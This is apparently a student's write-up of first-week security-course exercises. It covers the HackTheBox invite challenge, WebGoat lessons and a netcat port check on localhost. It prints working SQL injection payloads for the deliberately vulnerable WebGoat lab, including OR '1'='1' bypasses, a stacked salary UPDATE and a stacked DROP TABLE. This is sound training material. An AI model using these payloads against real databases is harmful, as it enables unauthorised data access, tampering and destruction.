# H1

Solutions to first week assignments.

## Table of Contents

* [a) Get invited to HackTheBox](#a-get-invited-to-HackTheBox)
* [b) Install WebGoat and login](#b-install-webgoat-and-login)
* [c) Solve WebGoat assignments](#c-solve-webgoat-assignments)
* [d) Install Kali Linux and test it out](#d-install-kali-linux-and-test-it-out)

---

## a) Get invited to HackTheBox

* opened developer console and found the first clue, that pointed me to search interesting Javascript file
* found a file pretty fast named inviteapi.min.js, that had an obfuscated Javascript function. I didn't try to solve the obfuscation and just tried the makeInviteCode function, which was the next clue. It guided me to make POST HTTP request to /api/invite/how/to/generate
* I did a POST HTTP request with curl to /api/invite/how/to/generate and received BASE64 encoded string

  ```shell
  curl -L -v -X POST www.hackthebox.eu/api/invite/how/to/generate
  ```

* I opened the encoded string like this and received the next clue

  ```shell
  echo "SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl" | base64 -d
  ```

* clue was: "In order to generate the invite code, make a POST request to /api/invite/generate"

  ```shell
  curl -L -v -X POST www.hackthebox.eu/api/invite/generate
  ```

* call gave me another BASE64 encoded string, which I opened and it gave me the code to log in to HackTheBox

  ```shell
  echo "QVNLQ1ItTkNTRk0tR0RRQ0UtQklQUUQtTVlSVUI" | base64 -d
  ```

---

## b) Install WebGoat and login

I downloaded [WebGoat Docker image](https://hub.docker.com/r/webgoat/webgoat-8.0/), ran it and managed to log in.

---

## c) Solve WebGoat assignments

* HTTP Basics
  - The HTTP Basics assignment was quite easy. Just needed to open developer console and view the source code to see that they validated, that posted magic number was 55
* Developer tools
  - Developer tools opens in Opera(MacOS) with command + options + i keyboard shortcut
  - CTRL+L clears console in Opera's console
  - calling the webgoat.customjs.phoneHome() function in console printed me the required output with -1182196480 phone number
  - opening the network tab in developer console and sending the request shows a request called network, which had a header with networkNum named form data with value of 32.69182959869092
* CIA Triad
  - 1 - 3
  - 2 - 1
  - 3 - 4
  - 4 - 2
* A1 Injection (intro)

  - select Bobs department

    ```sql
    SELECT department FROM Employees WHERE first_name = 'Bob' and last_name = 'Franco';
    ```

  - update Tobi Barnett's department

    ```sql
    UPDATE employees SET department = 'Sales' WHERE userid IN (select userid from employees WHERE first_name = 'Tobi' and last_name = 'Barnett')
    ```

  - add column to table

    ```sql
    ALTER TABLE employees ADD phone varchar(20);
    ```

  - grant alter table to

    ```sql
    GRANT ALTER TABLE TO UnauthorizedUser
    ```

  - injection

    ```sql
    SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
    ```

  - numeric sql injection: use numeral instead of strings

    ```sql
    SELECT * From user_data WHERE Login_Count = 1 and userid = 1 or 1 = 1
    ```

  - confidentiality

    ```sql
    SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = '1' OR '1' = '1';
    ```

  - integrity: close the auth_tan query and inject and update clause

    ```sql
    SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = '"'; UPDATE employees SET salary = 100000 WHERE auth_tan = '"3SL99A"'
    ```

  - availability: close the select query and add a drop clause which uncomments the end of the select clause

    ```sql
    SELECT * FROM access_log where action = '%'; DROP TABLE access_log --%;
     ```

---

## d) Install Kali Linux and test it out

I created a tool([setup-dev-env.sh](../tools/setup-dev-env.sh) bash script), that sets up a development environment for me. It runs WebGoat in Docker and Kali Linux on VirtualBox using Vagrant.

I tried netcat to test if my local machine had port 53 open.

    nc -v -w 3 localhost 53

The port was closed as suspected: <i><b>localhost [127.0.0.1] 53 (domain) : Connection refused</i></b>. I wanted to scan the udp port as well to see what does it report.

    nc -v -w 3 -u localhost 53

And interestinly it reported, that the 53/udp port was open: <i><b>localhost [127.0.0.1] 53 (domain) open</i></b>. The port is for local DNS responses, so it should be open.
